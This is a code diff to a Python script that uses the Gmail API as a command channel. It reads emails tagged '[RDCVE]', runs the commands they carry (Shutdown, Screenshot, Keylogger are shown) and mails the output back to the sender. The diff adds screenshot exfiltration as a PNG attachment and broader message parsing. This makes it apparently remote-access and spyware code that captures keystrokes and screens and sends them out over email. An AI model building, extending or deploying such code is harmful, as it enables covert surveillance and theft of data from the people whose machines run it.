@@ -64,9 +64,10 @@ def buildService():
     service = build('gmail', 'v1', credentials=creds)
 
 def checkRequirement(lines):
+    global command_execute
     if "[RDCVE]" in lines[0]:
         command_execute = lines[1].strip() if len(lines) >= 3 else None
-        command_argument = lines[2].strip() if len(lines) >= 4 else None
+        command_argument = lines[2].strip() if len(lines) >= 0 else None
         report = None
         if command_execute and command_argument:
             if command_execute == "Shutdown":
@@ -126,15 +127,16 @@ def checkRequirement(lines):
                 report = f"Keylogger: {keylogger}"
 
             print(report)
-            try:
-                with open("report.txt", 'w') as file: 
-                    file.write(report)
-                    print(f"Report has been saved to report.txt")
-            except Exception as e:
-                print(f"Error writing to file: {e}")
+            if command_execute != "Screenshot":
+                try:
+                    with open("report.txt", 'w') as file: 
+                        file.write(report)
+                        print(f"Report has been saved to report.txt")
+                except Exception as e:
+                    print(f"Error writing to file: {e}")
+            print(f"-------------------------\nFinish get information.")
 
 def sendReport(email_sender):
-    global service
     message = MIMEMultipart()
     message['to'] = email_sender
     message['subject'] = '[RDCVE] - Report'
@@ -143,12 +145,20 @@ def sendReport(email_sender):
     message.attach(MIMEText(body, 'plain'))
 
     try:
-        with open('report.txt', 'r') as file:
-            attachment = MIMEBase('application', 'octet-stream')
-            attachment.set_payload(file.read())
-            encoders.encode_base64(attachment)
-            attachment.add_header('Content-Disposition', 'attachment', filename='report.txt')
-            message.attach(attachment)
+        if command_execute != "Screenshot":
+            with open('report.txt', 'r') as file:
+                attachment = MIMEBase('application', 'octet-stream')
+                attachment.set_payload(file.read())
+                encoders.encode_base64(attachment)
+                attachment.add_header('Content-Disposition', 'attachment', filename='report.txt')
+                message.attach(attachment)
+        else:
+            with open('report.png', 'rb') as file:
+                attachment = MIMEBase('application', 'octet-stream')
+                attachment.set_payload(file.read())
+                encoders.encode_base64(attachment)
+                attachment.add_header('Content-Disposition', 'attachment', filename='report.png')
+                message.attach(attachment)
     except Exception as e:
         print(f"Error attaching file: {e}")
         return
@@ -180,24 +190,44 @@ def main():
                         name = values['name']
                         if name == 'From':
                             print(f"From: {values['value']}") #print the sender address
-                            email_sender = re.search(r'<([^>]+)>', values['value']).group(1)
-                    for part in msg['payload']['parts']:
+                            if (re.search(r'<([^>]+)>', values['value'])):
+                                email_sender = re.search(r'<([^>]+)>', values['value']).group(1)
+                            else:
+                                email_sender = values['value']
+                    if msg['payload'].get('parts', -1) == -1:
                         try:
-                            data = part['body']["data"]
+                            data = msg['payload']['body']['data']
                             byte_code = base64.urlsafe_b64decode(data)
                             text = byte_code.decode("utf-8")
-                            if message_count == 0:  # Print the first message only
-                                print("This is the message: ")
-                                print(str(text))
+                            #if message_count == 0:  # Print the first message only
+                            print("This is the message: ")
+                            print(str(text))
                                 # Parsing the message to extract command_execute and command_argument
-                                lines = text.split('\n')
-                                message_count += 1
-                                checkRequirement(lines)
-                                sendReport(email_sender)
-                            # mark the message as read (optional)
-                            # msg = service.users().messages().modify(userId='me', id=message['id'], body={'removeLabelIds': ['UNREAD']}).execute()
+                            lines = text.splitlines()
+                            print(lines)
+                            #message_count += 1
+                            checkRequirement(lines)
+                            sendReport(email_sender)
                         except BaseException as error:
-                            pass
+                            print(f"Error handling plain text message: {error}")
+                    else:
+                        for part in msg['payload']['parts']:
+                            try:
+                                data = part['body']["data"]
+                                byte_code = base64.urlsafe_b64decode(data)
+                                text = byte_code.decode("utf-8")
+                                if message_count == 0:  # Print the first message only
+                                    print("This is the message: ")
+                                    print(str(text))
+                                        # Parsing the message to extract command_execute and command_argument
+                                    lines = text.splitlines()
+                                    message_count += 1
+                                    checkRequirement(lines)
+                                    sendReport(email_sender)
+                            except BaseException as error:
+                                print(f"Error handling plain text message: {error}")
+                    # mark the message as read (optional)
+                    msg = service.users().messages().modify(userId='me', id=message['id'], body={'removeLabelIds': ['UNREAD']}).execute()
         except Exception as error:
             print(f'An error occurred: {error}')
         time.sleep(10)
